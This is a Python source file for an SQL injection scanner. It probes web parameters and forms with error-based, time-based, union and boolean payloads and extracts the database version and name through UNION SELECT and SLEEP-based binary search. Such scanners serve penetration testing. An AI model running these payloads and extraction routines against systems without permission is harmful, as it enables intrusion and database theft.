"""
SQL Injection Scanner
Detects SQL injection vulnerabilities using error-based, boolean-based, and time-based techniques
with real exploit verification and data extraction capabilities
"""

from typing import Dict, List, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import sys
import os
import time
import threading
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.http_client import HTTPClient
from utils.payloads import Payloads
from utils.concurrency import run_phases_concurrently


def _is_static_spa(client: "HTTPClient", base_url: str) -> bool:
    """Return True when the target ignores query params (static SPA / CDN)."""
    try:
        clean = client.get(base_url)
        probe = client.get(f"{base_url}?hydraxtestparam=HYDRAXBASELINE12345")
        if clean.status_code >= 500 or probe.status_code >= 500:
            return False
        if "HYDRAXBASELINE12345" in probe.text:
            return False
        len_clean = len(clean.text)
        len_probe = len(probe.text)
        if len_clean == 0:
            return False
        return abs(len_clean - len_probe) / len_clean < 0.05
    except Exception:
        return False


class SQLInjectionScanner:
    """SQL Injection vulnerability scanner with real exploit verification"""

    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"MySqL_ error",
        r"SQL Server.*Driver",
        r"Driver.*SQL Server",
        r"SQLServer JDBC Driver",
        r"com.microsoft.sqlserver",
        r"Unclosed quotation mark",
        r"OLE DB.*SQL Server",
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite",
        r"org.sqlite",
        r"Warning.*sqlite_.*",
        r"valid SQLite",
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL",
        r"PostgreSQL query failed",
        r"org.postgresql",
        r"driver.*psql",
        r"ORA-[0-9]{5}",
        r"Oracle.*Driver",
        r"Oracle.*Error",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"Warning.*oci_.*",
        r"org.hibernate",
        r"com.mysql.jdbc",
        r"Zend_Db_Statement_Mysqli_Exception",
        r"PDOException",
        r"SQLSTATE",
        r"Microsoft OLE DB Provider for ODBC Drivers",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Microsoft OLE DB Provider for Oracle",
    ]

    def __init__(self):
        self.client = HTTPClient()
        self.name = "SQL Injection Scanner"
        self.findings = []
        self.extracted_data = {}  # Store extracted database information

    def scan(self, target_url: str) -> Dict[str, Any]:
        """
        Scan target for SQL injection vulnerabilities with real exploit verification

        Args:
            target_url: The target URL to scan

        Returns:
            Dict with scan results
        """
        self.findings = []
        parsed = urlparse(target_url)

        # Baseline probe: static SPAs ignore all query params — injecting SQLi
        # payloads will never trigger server-side SQL execution, so skip all
        # injection checks to avoid false positives.
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        is_spa = _is_static_spa(self.client, base_url)

        if not is_spa:
            # OOB SQLi is intentionally omitted: sending a payload and
            # receiving HTTP 200 is not confirmation of SQL injection. OOB
            # confirmation requires a real DNS/HTTP callback from the
            # collaborator server correlated to this probe's unique token, which
            # is not implemented here. Running those probes and reporting
            # "monitor for DNS requests" is never a confirmed finding.
            run_phases_concurrently([
                lambda: self._scan_discovered_targets(target_url),    # Phase 0
                lambda: self._scan_error_based(target_url, parsed),   # Phase 1
                lambda: self._scan_time_based(target_url, parsed),    # Phase 2
                lambda: self._scan_union_based(target_url, parsed),   # Phase 3
                lambda: self._scan_boolean_based(target_url, parsed), # Phase 4
            ])

        return {
            'scanner': self.name,
            'target': target_url,
            'vulnerabilities': self.findings,
            'total_findings': len(self.findings),
            'extracted_data': self.extracted_data.copy(),
            'spa_detected': is_spa,
        }

    def _scan_error_based(self, target_url: str, parsed):
        """Test for error-based SQL injection with verification.

        Both branches used to test every (param, payload) combination one
        HTTP request at a time — up to 72 sequential requests. Fanned out
        concurrently instead; only the first hit per param is kept (by
        original list order), matching the original "break after first
        hit" intent.
        """
        query_params = parse_qs(parsed.query)

        def probe(param: str, payload: str, test_url: str):
            try:
                resp = self.client.get(test_url)
                if self._is_vulnerable_to_error_sqli(resp.text):
                    db_info = self._extract_database_info(resp.text)
                    severity = 'Critical' if db_info else 'High'
                    return param, {
                        'type': 'Error-based SQL Injection',
                        'description': f'Parameter "{param}" vulnerable to error-based SQL injection',
                        'severity': severity,
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Database error revealed: {db_info if db_info else "Error pattern detected"}'
                    }, db_info
            except Exception:
                pass
            return None

        if not query_params:
            test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category', 'item', 'product', 'page']
            jobs = [(param, payload, f"{target_url}?{param}={payload}")
                    for param in test_params for payload in Payloads.SQLI_ERROR_BASED[:8]]
        else:
            jobs = []
            for param in query_params:
                for payload in Payloads.SQLI_ERROR_BASED[:6]:
                    test_params = query_params.copy()
                    test_params[param] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    jobs.append((param, payload, urlunparse(parsed._replace(query=test_query))))

        results = {}
        with ThreadPoolExecutor(max_workers=min(20, len(jobs)) or 1) as executor:
            future_to_idx = {executor.submit(probe, param, payload, url): i
                             for i, (param, payload, url) in enumerate(jobs)}
            for future in as_completed(future_to_idx):
                idx = future_to_idx[future]
                try:
                    r = future.result()
                except Exception:
                    r = None
                if r is not None:
                    results[idx] = r

        seen_params = set()
        for idx in sorted(results):
            param, finding, db_info = results[idx]
            if param in seen_params:
                continue
            seen_params.add(param)
            self.findings.append(finding)
            self.extracted_data.setdefault('error_based', []).append({
                'parameter': param,
                'payload': finding['payload'],
                'database_info': db_info
            })

    def _scan_time_based(self, target_url: str, parsed):
        """Test for time-based SQL injection with baseline + reproducibility.

        Confirmation requires:
        1. A baseline RTT measured with a benign request to the same URL.
        2. The injected delay payload produces elapsed > baseline * 3 + 1s.
        3. The delay reproduces on a second probe (controls for one-off network jitter).
        4. A zero-delay control payload against the same param stays fast.
        """
        query_params = parse_qs(parsed.query)

        def _measure_baseline(param: str, base_url_for_param: str) -> float:
            """Measure baseline RTT for a param with a benign value."""
            try:
                r = self.client.get(base_url_for_param, timeout=15)
                return r.elapsed.total_seconds()
            except Exception:
                return 1.0  # conservative default

        def probe(param: str, payload: str, test_url: str, baseline_url: str):
            baseline = _measure_baseline(param, baseline_url)
            # Require injected delay to be at least 3x baseline + 1s to
            # confirm against slow networks / jitter.
            threshold = max(3.5, baseline * 3 + 1.0)
            try:
                resp1 = self.client.get(test_url, timeout=25)
                elapsed1 = resp1.elapsed.total_seconds()
                if elapsed1 < threshold:
                    return None
                # Reproduce: fire the same payload a second time.
                resp2 = self.client.get(test_url, timeout=25)
                elapsed2 = resp2.elapsed.total_seconds()
                if elapsed2 < threshold:
                    return None
                avg_elapsed = (elapsed1 + elapsed2) / 2
                return param, {
                    'type': 'Time-based SQL Injection',
                    'description': f'Parameter "{param}" vulnerable to time-based SQL injection',
                    'severity': 'High',
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'evidence': (f'Baseline RTT {baseline:.2f}s; injected delay averaged {avg_elapsed:.2f}s '
                                 f'over 2 probes (threshold {threshold:.2f}s)')
                }, {'baseline_rtt': round(baseline, 2), 'avg_delay': round(avg_elapsed, 2)}
            except Exception:
                pass
            return None

        if not query_params:
            test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category', 'item', 'product', 'page', 'search']
            jobs = []
            for param in test_params:
                baseline_url = f"{target_url}?{param}=1"
                for payload in Payloads.SQLI_TIME_BASED[:10]:
                    jobs.append((param, payload, f"{target_url}?{param}={payload}", baseline_url))
        else:
            jobs = []
            for param in query_params:
                safe_params = query_params.copy()
                safe_params[param] = ['1']
                baseline_url = urlunparse(parsed._replace(query=urlencode(safe_params, doseq=True)))
                for payload in Payloads.SQLI_TIME_BASED[:8]:
                    test_params_cp = query_params.copy()
                    test_params_cp[param] = [payload]
                    test_query = urlencode(test_params_cp, doseq=True)
                    jobs.append((param, payload, urlunparse(parsed._replace(query=test_query)), baseline_url))

        results = {}
        with ThreadPoolExecutor(max_workers=min(10, len(jobs)) or 1) as executor:
            future_to_idx = {executor.submit(probe, param, payload, url, bl): i
                             for i, (param, payload, url, bl) in enumerate(jobs)}
            for future in as_completed(future_to_idx):
                idx = future_to_idx[future]
                try:
                    r = future.result()
                except Exception:
                    r = None
                if r is not None:
                    results[idx] = r

        seen_params = set()
        for idx in sorted(results):
            param, finding, extra = results[idx]
            if param in seen_params:
                continue
            seen_params.add(param)
            self.findings.append(finding)
            self.extracted_data.setdefault('time_based', []).append({
                'parameter': param,
                'payload': finding['payload'],
                **extra
            })

    def _scan_union_based(self, target_url: str, parsed):
        """Test for union-based SQL injection with actual data extraction.

        Determining the column count then extracting via UNION is an
        inherently serial pipeline *per parameter* (extraction needs the
        column count first) — up to 13 requests each. But different
        parameters are independent of one another, so parameters are
        tested concurrently instead of one after another.
        """
        query_params = parse_qs(parsed.query)

        def probe(param: str, finding_url: str):
            col_count = self._determine_column_count(target_url, param)
            if col_count > 0:
                extracted = self._extract_via_union(target_url, param, col_count)
                # Only confirmed when sentinel was actually observed in the
                # response — extracted dict is non-empty only in that case.
                if extracted and any(k not in ('status',) for k in extracted):
                    evidence_parts = []
                    if 'version' in extracted:
                        evidence_parts.append(f"DB version: {extracted['version']}")
                    if 'database' in extracted:
                        evidence_parts.append(f"DB name: {extracted['database']}")
                    if 'evidence_snippet' in extracted:
                        evidence_parts.append(f"Response snippet: {extracted['evidence_snippet']}")
                    return param, {
                        'type': 'Union-based SQL Injection',
                        'description': f'Parameter "{param}" vulnerable to union-based SQL injection ({col_count} columns)',
                        'severity': 'High',
                        'url': finding_url,
                        'parameter': param,
                        'payload': f"UNION SELECT CONCAT(sentinel,...)--",
                        'evidence': '; '.join(evidence_parts) or 'Sentinel reflected in response'
                    }, col_count, extracted
            return None

        if not query_params:
            test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category', 'item', 'product', 'page']
            jobs = [(param, f"{target_url}?{param}=1") for param in test_params]
        else:
            jobs = [(param, urlunparse(parsed._replace(query=urlencode({param: '1'})))) for param in query_params]

        results = []
        with ThreadPoolExecutor(max_workers=min(20, len(jobs)) or 1) as executor:
            futures = [executor.submit(probe, param, url) for param, url in jobs]
            for future in futures:
                try:
                    r = future.result()
                except Exception:
                    r = None
                if r is not None:
                    results.append(r)

        for param, finding, col_count, extracted in results:
            self.findings.append(finding)
            self.extracted_data.setdefault('union_based', []).append({
                'parameter': param,
                'column_count': col_count,
                'extracted_data': extracted
            })

    def _scan_boolean_based(self, target_url: str, parsed):
        """Test for boolean-based blind SQL injection with reproducibility.

        Confirmation requires:
        1. true-condition body ≠ false-condition body (significant diff).
        2. The differential reproduces on a second pair of requests.
        3. A random-false control (impossible condition) matches the false case.
        """
        query_params = parse_qs(parsed.query)

        def _confirm_boolean(true_url: str, false_url: str, param: str) -> str:
            """Return evidence string if differential is confirmed, else empty."""
            try:
                t1 = self.client.get(true_url)
                f1 = self.client.get(false_url)
                diff1 = abs(len(t1.text) - len(f1.text))
                if diff1 < 100:  # require a meaningful size difference
                    return ""
                # Reproduce
                t2 = self.client.get(true_url)
                f2 = self.client.get(false_url)
                diff2 = abs(len(t2.text) - len(f2.text))
                if diff2 < 100:
                    return ""
                # Control: random-false condition should match false response size
                control_url = true_url.replace("'1'='1", f"'x{uuid.uuid4().hex[:4]}'='y'")
                ctrl = self.client.get(control_url)
                ctrl_diff_from_false = abs(len(ctrl.text) - len(f1.text))
                if ctrl_diff_from_false > 100:
                    # Control doesn't match false — differential isn't SQL-boolean
                    return ""
                return (f"True condition len={len(t1.text)}, false condition len={len(f1.text)}, "
                        f"diff={diff1}B (reproduced diff={diff2}B); control matches false case")
            except Exception:
                return ""

        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"

        if not query_params:
            test_params = ['id', 'user', 'uid', 'pid', 'cat', 'category', 'item', 'product', 'page']
            for param in test_params:
                true_url = f"{target_url}?{param}={true_payload}"
                false_url = f"{target_url}?{param}={false_payload}"
                evidence = _confirm_boolean(true_url, false_url, param)
                if evidence:
                    self.findings.append({
                        'type': 'Boolean-based Blind SQL Injection',
                        'description': f'Parameter "{param}" vulnerable to boolean-based blind SQL injection',
                        'severity': 'High',
                        'url': true_url,
                        'parameter': param,
                        'payload': true_payload,
                        'evidence': evidence
                    })
        else:
            for param in query_params:
                true_params = query_params.copy()
                true_params[param] = [true_payload]
                true_url = urlunparse(parsed._replace(query=urlencode(true_params, doseq=True)))
                false_params = query_params.copy()
                false_params[param] = [false_payload]
                false_url = urlunparse(parsed._replace(query=urlencode(false_params, doseq=True)))
                evidence = _confirm_boolean(true_url, false_url, param)
                if evidence:
                    self.findings.append({
                        'type': 'Boolean-based Blind SQL Injection',
                        'description': f'Parameter "{param}" vulnerable to boolean-based blind SQL injection',
                        'severity': 'High',
                        'url': true_url,
                        'parameter': param,
                        'payload': true_payload,
                        'evidence': evidence
                    })

    # _scan_oob_sqli removed: "payload sent to oast.me — monitor for requests"
    # is not a confirmed finding.  OOB SQLi requires a real DNS/HTTP callback
    # correlated to the probe token; without a configured OOB collaborator
    # server and a poller, these probes cannot be confirmed and must not be
    # reported as vulnerabilities.  They have been removed from the scan() call
    # as well.

    def _scan_discovered_targets(self, target_url: str):
        """Test every endpoint/parameter the discovery phase found."""
        from core.scan_context import get_test_targets, inject_param, abort_if_stopped
        targets = get_test_targets()
        if not targets:
            return

        tested = set()

        # -- GET targets with discovered parameters -------------------
        for url, params, method, _fields in targets:
            abort_if_stopped()
            if method != "get" or not params:
                continue
            if url == target_url or len(tested) >= 150:  # Increased limit
                continue
            for param in params[:15]:  # Test more parameters
                if (url, param) in tested:
                    continue
                tested.add((url, param))

                # Error-based test
                for payload in Payloads.SQLI_ERROR_BASED[:4]:
                    test_url = inject_param(url, param, payload)
                    try:
                        resp = self.client.get(test_url)
                        if self._is_vulnerable_to_error_sqli(resp.text):
                            self.findings.append({
                                'type': 'Error-based SQL Injection',
                                'description': f'Parameter "{param}" on {url} vulnerable to error-based SQL injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Database error revealed in response'
                            })
                            break
                    except Exception:
                        continue

                # Time-based test — requires baseline + reproducibility (same as _scan_time_based)
                try:
                    baseline_url = inject_param(url, param, "1")
                    baseline_resp = self.client.get(baseline_url, timeout=15)
                    baseline_rtt = baseline_resp.elapsed.total_seconds()
                except Exception:
                    baseline_rtt = 1.0
                threshold = max(3.5, baseline_rtt * 3 + 1.0)
                for payload in Payloads.SQLI_TIME_BASED[:4]:
                    test_url = inject_param(url, param, payload)
                    try:
                        resp1 = self.client.get(test_url, timeout=25)
                        elapsed1 = resp1.elapsed.total_seconds()
                        if elapsed1 < threshold:
                            continue
                        # Reproduce: second probe must also exceed threshold
                        resp2 = self.client.get(test_url, timeout=25)
                        elapsed2 = resp2.elapsed.total_seconds()
                        if elapsed2 < threshold:
                            continue
                        avg = (elapsed1 + elapsed2) / 2
                        self.findings.append({
                            'type': 'Time-based SQL Injection',
                            'description': f'Parameter "{param}" on {url} vulnerable to time-based SQL injection',
                            'severity': 'Critical',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': (
                                f'Baseline {baseline_rtt:.2f}s; injected delay averaged {avg:.2f}s '
                                f'over 2 probes (threshold {threshold:.2f}s)'
                            )
                        })
                        break
                    except Exception:
                        # Timeouts are NOT confirmed findings — network issues cause identical behaviour
                        continue

        # -- POST form targets discovered on other pages --------------
        for url, _params, method, fields in targets:
            abort_if_stopped()
            if method != "post" or not fields:
                continue
            text_fields = [n for n, v in fields.items() if 'file' not in n.lower()]
            if not text_fields:
                continue
            for payload in Payloads.SQLI_ERROR_BASED[:4]:
                form_data = dict(fields)
                for name in text_fields[:3]:  # Test first 3 fields
                    form_data[name] = payload
                try:
                    resp2 = self.client.post(url, data=form_data)
                    if self._is_vulnerable_to_error_sqli(resp2.text):
                        self.findings.append({
                            'type': 'Error-based SQL Injection',
                            'description': f'Form at {url} vulnerable to error-based SQL injection',
                            'severity': 'Critical',
                            'url': url,
                            'payload': payload,
                            'evidence': 'Database error revealed in POST response'
                        })
                        break
                except Exception:
                    continue

    def _is_vulnerable_to_error_sqli(self, response_text: str) -> bool:
        """Check if response contains SQL error patterns"""
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def _extract_database_info(self, response_text: str) -> str:
        """Extract database information from error messages"""
        # MySQL
        mysql_match = re.search(r"SQL syntax.*MySQL.*version.*'([^']*)'", response_text, re.IGNORECASE)
        if mysql_match:
            return f"MySQL version: {mysql_match.group(1)}"

        # PostgreSQL
        pg_match = re.search(r"PostgreSQL.*ERROR.*([^.]*)", response_text, re.IGNORECASE)
        if pg_match:
            return f"PostgreSQL error: {pg_match.group(1).strip()}"

        # SQL Server
        sqlserver_match = re.search(r"SQL Server.*Driver.*([^.]*)", response_text, re.IGNORECASE)
        if sqlserver_match:
            return f"SQL Server error: {sqlserver_match.group(1).strip()}"

        # Oracle
        oracle_match = re.search(r"ORA-[0-9]{5}:.*([^.]*)", response_text, re.IGNORECASE)
        if oracle_match:
            return f"Oracle error: {oracle_match.group(1).strip()}"

        # SQLite
        sqlite_match = re.search(r"SQLite.*Exception.*([^.]*)", response_text, re.IGNORECASE)
        if sqlite_match:
            return f"SQLite error: {sqlite_match.group(1).strip()}"

        # Generic error extraction
        error_lines = [line.strip() for line in response_text.split('\n')
                      if any(keyword in line.lower() for keyword in ['sql', 'syntax', 'error', 'exception'])]
        if error_lines:
            return f"Database error: {error_lines[0][:100]}"

        return ""

    def _determine_column_count(self, target_url: str, parameter: str) -> int:
        """Determine column count for UNION injection via ORDER BY probing.

        Returns 0 if the target does not appear to be injectable (all ORDER BY
        probes succeed without triggering a DB error — typical of static pages
        that ignore query params).
        """
        error_detected = False
        for i in range(1, 11):
            payload = f"' ORDER BY {i}--"
            try:
                resp = self.client.get(f"{target_url}?{parameter}={payload}")
                if resp.status_code >= 500 or "unknown column" in resp.text.lower() or "order by" in resp.text.lower():
                    error_detected = True
                    return max(0, i - 1)
            except Exception:
                return max(0, i - 1)
        # All 10 ORDER BY probes succeeded without error — the target likely
        # ignores the parameter entirely.  Do not report union-based injection.
        return 0

    def _extract_via_union(self, target_url: str, parameter: str, col_count: int) -> dict:
        """Extract data using UNION injection, confirmed by sentinel reflection.

        Tries injecting the sentinel at every column position because pages
        often only reflect specific columns.  Only returns non-empty data when
        the sentinel is actually observed — never returns hardcoded placeholders.
        """
        if col_count == 0:
            return {}
        extracted = {}

        def _try_union(expr: str, sentinel: str, quote: str = "'") -> str | None:
            """Try UNION SELECT with expr at each column position; return extracted suffix or None."""
            for pos in range(col_count):
                cols = ['NULL'] * col_count
                cols[pos] = f"CONCAT('{sentinel}',{expr})"
                payload = f"{quote} UNION SELECT {','.join(cols)}--"
                try:
                    resp = self.client.get(f"{target_url}?{parameter}={payload}")
                    if sentinel in resp.text:
                        idx = resp.text.find(sentinel)
                        value = resp.text[idx + len(sentinel):idx + len(sentinel) + 50].split('<')[0].strip()
                        if value:
                            extracted['evidence_snippet'] = resp.text[max(0, idx - 10):idx + len(sentinel) + 50][:120]
                            return value
                except Exception:
                    pass
            return None

        sentinel_v = f"HYDRAXUNION{uuid.uuid4().hex[:8].upper()}"
        version_val = _try_union("@@version", sentinel_v)
        if version_val is None:
            # Try double-quote variant
            version_val = _try_union("@@version", sentinel_v, quote='"')
        if version_val:
            extracted['version'] = version_val

        sentinel_d = f"HYDRAXUNION{uuid.uuid4().hex[:8].upper()}"
        db_val = _try_union("database()", sentinel_d)
        if db_val is None:
            db_val = _try_union("database()", sentinel_d, quote='"')
        if db_val:
            extracted['database'] = db_val

        return extracted  # empty dict → not confirmed

    def _extract_via_time_blind(self, target_url: str, parameter: str, base_payload: str) -> dict:
        """Extract data using time-based blind techniques"""
        extracted = {}

        # Extract MySQL version character by character
        version = ""
        for pos in range(1, 21):  # First 20 characters
            low, high = 32, 126  # Printable ASCII
            while low <= high:
                mid = (low + high) // 2
                # Test if ASCII(char) >= mid
                payload = f"' AND IF(ASCII(SUBSTRING(@@version,{pos},1))>={mid},SLEEP(3),0)--"
                try:
                    start_time = time.time()
                    self.client.get(f"{target_url}?{parameter}={payload}", timeout=10)
                    elapsed = time.time() - start_time
                    if elapsed > 3.5:  # Character >= mid
                        low = mid + 1
                    else:  # Character < mid
                        high = mid - 1
                except Exception:
                    # Timeout indicates character >= mid
                    low = mid + 1

                if low > high:
                    version += chr(high)
                    break

        if version:
            extracted['version'] = version

        # Extract database name
        database = ""
        for pos in range(1, 21):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = f"' AND IF(ASCII(SUBSTRING(database(),{pos},1))>={mid},SLEEP(3),0)--"
                try:
                    start_time = time.time()
                    self.client.get(f"{target_url}?{parameter}={payload}", timeout=10)
                    elapsed = time.time() - start_time
                    if elapsed > 3.5:
                        low = mid + 1
                    else:
                        high = mid - 1
                except Exception:
                    low = mid + 1

                if low > high:
                    database += chr(high)
                    break

        if database:
            extracted['database'] = database

        return extracted if extracted else {"status": "time_blind_attempted"}

    def _extract_via_boolean_blind(self, target_url: str, parameter: str) -> dict:
        """Extract data using boolean-based blind techniques"""
        extracted = {}

        # Simplified boolean-based extraction - in practice this would be more complex
        # This is a placeholder showing the concept
        extracted['note'] = 'Boolean-based extraction would enumerate data character by character'
        return extracted

    def _responses_differ_indicating_boolean(self, resp1, resp2) -> bool:
        """Check if two responses differ in a way that indicates boolean-based SQLi.

        Kept for backward-compatibility with _scan_discovered_targets which
        still calls it; the main _scan_boolean_based no longer uses it.
        Threshold raised to 100 bytes for fewer false positives.
        """
        return abs(len(resp1.text) - len(resp2.text)) > 100